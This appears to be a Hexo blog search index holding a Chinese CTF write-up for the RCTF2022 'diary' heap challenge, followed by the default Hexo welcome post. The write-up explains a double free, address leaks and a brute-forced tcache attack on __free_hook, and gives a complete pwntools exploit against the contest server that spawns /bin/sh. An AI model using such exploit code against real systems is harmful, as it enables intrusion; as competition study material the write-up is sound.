<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>RCTF2022diary</title>
      <link href="/2022/12/13/RCTF2022diary/"/>
      <url>/2022/12/13/RCTF2022diary/</url>
      
        <content type="html"><![CDATA[<p>这次RCTF本来准备给校队认真打的，结果写了一题我们学校突然说放假了，我就兴奋的没怎么看了。</p><p>就看了diary和game，以为game是签到题，结果是非预期我不知道。看来linux部署这块得好好学学。</p><p>要是跟着r3打就好了，我就能把精力放在那几道堆题上了（bushi）</p><p>看了一下大战队们的wp，解法好像跟我的完全不一样（比我的简单多了），就来分享一下。</p><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>本质是个堆题，可以add,edit,delete，有意思的事还能encrypt,decrypt，其实我都没把题目逆完。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我代码也怎么仔细审，本来想fuzz的。后来自己随便试了试，在创建多个chunk后，如果我们删掉非最后一个的chunk就会导致一个double free的效果。</p><pre class=" language-python"><code class="language-python">sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'add#1#2#3#4#5#6#'</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'add#2#2#3#4#5#6#'</span> <span class="token operator">+</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'delete#0'</span><span class="token punctuation">)</span></code></pre><p><img src="1.png" alt="double free"></p><p>有这个double free我们就基本上随便打了吧，因为是0x311的堆块，libc和heap地址都有了</p><p>问题是由于每个堆块前4个字节都会被置为0x20，我们tcache attack就没那么方便了。</p><p>我瞄了眼nu1l的wp里提到了什么encrypt时候的calloc啥的，这块我都没看。我的想法是：<strong>有什么方法能让前4个字节，变成我们预期打的free_hook地址?</strong></p><p>试了下encrypt函数,可以对前四字节逐字节加密，这个加密是和一系列随机字节异或产生的。而且这个随机后的值我们也可以通过show拿到，<strong>那么我们只要逐字节不断爆破，获得预期字节，就能得到free_hook地址。</strong> 也不用把程序逆完了。</p><pre class=" language-python"><code class="language-python">i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> i<span class="token operator">!=</span><span class="token number">4</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        encrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>        show<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        ru<span class="token punctuation">(</span><span class="token string">'6\n'</span><span class="token punctuation">)</span>        r<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        cur <span class="token operator">=</span> u8<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            decrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>            i <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                encrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'another try'</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token operator">==</span>bruce_byte<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'succuss brute'</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#gdb.attach(io)</span>            i<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">break</span></code></pre><h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> random<span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>ru         <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span>a<span class="token punctuation">)</span>r         <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">:</span>        io<span class="token punctuation">.</span>read<span class="token punctuation">(</span>n<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>sa         <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>sl        <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>a<span class="token punctuation">)</span>s         <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">lg</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[1;31;40m%20s-->0x%x\033[0m'</span><span class="token operator">%</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = process('./pwn')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'119.13.105.35'</span><span class="token punctuation">,</span> <span class="token number">10111</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#elf = ELF('./pwn')</span><span class="token comment" spellcheck="true">#libc = ELF('/root/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sa<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span><span class="token string">'add#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'#2#3#4#5#6#'</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sa<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span><span class="token string">'update#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'#'</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'show#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'delete#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'encrypt#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'#1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'decrypt#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak heap</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'6\n'</span><span class="token punctuation">)</span>leak_heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_heap'</span><span class="token punctuation">,</span> leak_heap<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak libc</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">16</span><span class="token operator">+</span>i<span class="token punctuation">,</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dele<span class="token punctuation">(</span><span class="token number">10</span><span class="token operator">-</span>i<span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'6\n'</span><span class="token punctuation">)</span>leak_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_libc'</span><span class="token punctuation">,</span> leak_libc<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak_libc <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7f17465e4be0</span> <span class="token operator">-</span> <span class="token number">0x7f17463f8000</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_base'</span><span class="token punctuation">,</span> libc_base<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span><span class="token comment" spellcheck="true"># tcache attack</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">+</span>i<span class="token punctuation">,</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>target <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7fc9ae630e48</span> <span class="token operator">-</span><span class="token number">0x7fc9ae442000</span><span class="token punctuation">)</span>  <span class="token operator">-</span><span class="token number">4</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>target <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x300</span><span class="token punctuation">)</span>bruce_byte <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>bruce_byte<span class="token punctuation">.</span>append<span class="token punctuation">(</span>target <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>bruce_byte<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>target <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>bruce_byte<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>target <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>bruce_byte<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>target <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>bruce_byte<span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'target'</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pause()</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b*$rebase(0x30d5)')</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> i<span class="token operator">!=</span><span class="token number">4</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        encrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>        show<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        ru<span class="token punctuation">(</span><span class="token string">'6\n'</span><span class="token punctuation">)</span>        r<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        cur <span class="token operator">=</span> u8<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            decrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>            i <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                encrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'another try'</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token operator">==</span>bruce_byte<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'succuss brute'</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#gdb.attach(io)</span>            i<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'succuss rute'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> b<span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">41</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>bdele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="比赛总结"><a href="#比赛总结" class="headerlink" title="比赛总结"></a>比赛总结</h3><p>其实这题我纯纯瞎猫碰死耗子写的，题目也没审完。好久没认真打ctf感觉自己专注度，体力啥的下降很大，学校一堆屁事牵扯了很多精力，原来跟着r3打也都是别人找完洞自己偷鸡写个脚本。从今天开始要痛定思痛，加强时间管理，不能摆下去了。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/04/14/hello-world/"/>
      <url>/2022/04/14/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
